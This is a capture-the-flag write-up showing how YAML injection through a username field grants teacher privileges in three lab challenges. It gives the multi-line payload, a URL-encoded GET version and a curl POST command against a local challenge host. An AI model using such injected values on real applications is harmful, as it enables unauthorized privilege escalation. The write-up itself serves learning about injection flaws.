# YAML Injection

## Teacher Login 2

```text
YAML Injection Login

Welcome! Can you log in as teacher?

Current Database (users.yaml)

Add a User
Username:

Login
Username:
```

The input fields are of **textarea** type

On adding a user, the database looks like:

```yaml
- username: user
  is_teacher: no
```

Injecting "is_teacher: yes" by adding a user of name:

```text
user2
  is_teacher: yes
- username: user3
```

Now, the database looks like:

```yaml
- username: user2
  is_teacher: yes
- username: user3
  is_teacher: no
- username: user
  is_teacher: no
```

Logging in by "user2" gives the flag

## Teacher Login 3

This is similar to the previous one, except the input fields are of **text** type, so we cannot send multi-line inputs

On inspecting, we see that the request for adding a user is made at `/add?user=<username>`

URL-encode the previous payload and add the user: `/add?user=user2%0A%20%20is_teacher%3A%20yes%0A-%20username%3A%20user3`

Then proceed as before to get the flag

## Teacher Login 4

This is similar to the previos one, except that in this one, POST request is used instead of GET

We can use curl to make the POST request:

```shell
curl 'http://challenge.localhost/add' -X POST --data-raw $'user=user2\n  is_teacher: yes\n- username: user3'
```

> The `$` is needed to pass newline in the payload
